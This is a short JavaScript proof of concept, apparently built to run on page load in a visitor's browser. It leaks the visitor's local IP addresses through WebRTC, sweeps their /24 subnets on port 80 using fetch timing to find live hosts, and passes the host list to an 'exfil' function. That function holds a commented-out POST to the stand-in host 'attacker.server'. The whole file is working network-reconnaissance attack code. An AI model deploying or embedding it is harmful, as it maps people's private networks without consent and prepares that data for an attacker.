let port = 80;
let requestTimeout = 7000;
let aliveThreshold = 1000;

// Send data somewhere
function exfil(data) {
  console.log("Found:", data);
  //   fetch("http://attacker.server", {
  //     method: "POST",
  //     mode: "cors",
  //     body: JSON.stringify({ ips: data })
  //   });
}

// Get first 3 octets of client ip address
function getIPBases() {
  return new Promise((resolve, reject) => {
    let addrs = [];
    let RTCPeerConnection =
      window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
    if (!RTCPeerConnection) reject();

    // Find ip addresses in sdp
    function findIPs(sdp) {
      let re = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g;
      let matches = sdp.match(re);
      matches.forEach(addr => {
        if (!["0.0.0.0", "127.0.0.1"].includes(addr) && !addrs.includes(addr))
          addrs.push(addr);
      });
    }

    // Create connection
    var rtc = new RTCPeerConnection({ iceServers: [] });
    rtc.createDataChannel("", { reliable: false });
    rtc.onicecandidate = evt => {
      if (evt.candidate) findIPs(evt.candidate.candidate);
    };

    setTimeout(() => {
      rtc.createOffer(
        offerDesc => {
          findIPs(offerDesc.sdp);
          rtc.setLocalDescription(offerDesc);
          // Convert ip addreses to first 3 octets
          setTimeout(() => {
            let bases = addrs.map(a => {
              let p = a.split(".");
              return p[0] + "." + p[1] + "." + p[2] + ".";
            });
            resolve(bases);
          }, 100);
        },
        function(e) {}
      );
    }, 700);
  });
}

window.addEventListener("load", () => {
  let scans = {};
  getIPBases().then(addrs => {
    addrs.forEach(a => {
      // Run scans for each base address
      for (let i = 1; i < 254; i++) {
        let ip = a + i;
        let startTime = new Date().getTime();
        scans[ip] = { up: false, done: false };

        setTimeout(() => {
          scans[ip].done = true;
        }, requestTimeout);

        fetch("http://" + ip + ":" + port).finally(() => {
          let dt = new Date().getTime() - startTime; // Calc request time
          scans[ip].up = dt < aliveThreshold;
          scans[ip].done = true;
        });
      }
    });
  });

  // Wait a sec
  setTimeout(() => {
    // Check if scans are finished
    let i = setInterval(() => {
      let ips = Object.keys(scans);
      for (let i = 0; i < ips.length; i++) {
        let s = scans[ips[i]];
        if (!s.done) return;
      }

      // Get scan results
      let aliveHosts = Object.keys(scans).filter(ip => {
        if (scans[ip].up) return ip;
      });
      exfil(aliveHosts);

      clearInterval(i);
    }, 100);
  }, requestTimeout);
});
